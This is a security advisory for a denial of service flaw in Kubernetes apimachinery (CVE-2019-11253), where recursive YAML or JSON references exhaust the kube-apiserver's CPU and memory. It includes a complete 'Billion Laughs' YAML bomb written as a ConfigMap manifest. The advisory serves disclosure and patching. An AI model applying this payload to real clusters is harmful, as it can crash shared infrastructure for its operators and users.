# Kubernetes apimachinery packages vulnerable to unbounded recursion in JSON or YAML parsing

**GHSA**: GHSA-74fp-r6jw-h4mp | **CVE**: N/A | **Severity**: high (CVSS 7.5)

**CWE**: CWE-20, CWE-776

**Affected Packages**:
- **k8s.io/apimachinery** (go): < 0.0.0-20190927203648-9ce6eca90e73

## Description

CVE-2019-11253 is a denial of service vulnerability in the kube-apiserver, allowing authorized users sending malicious YAML or JSON payloads to cause kube-apiserver to consume excessive CPU or memory, potentially crashing and becoming unavailable. 

When creating a ConfigMap object which has recursive references contained in it, excessive CPU usage can occur. This appears to be an instance of a "Billion Laughs" attack which is quite well known as an XML parsing issue.

Applying this manifest to a cluster causes the client to hang for some time with considerable CPU usage.

```yaml
apiVersion: v1
data:
  a: &a ["web","web","web","web","web","web","web","web","web"]
  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
  e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
  g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
  h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
  i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
kind: ConfigMap
metadata:
  name: yaml-bomb
  namespace: default
```
### Specific Go Packages Affected
- k8s.io/apimachinery/pkg/runtime/serializer/json
- k8s.io/apimachinery/pkg/util/json

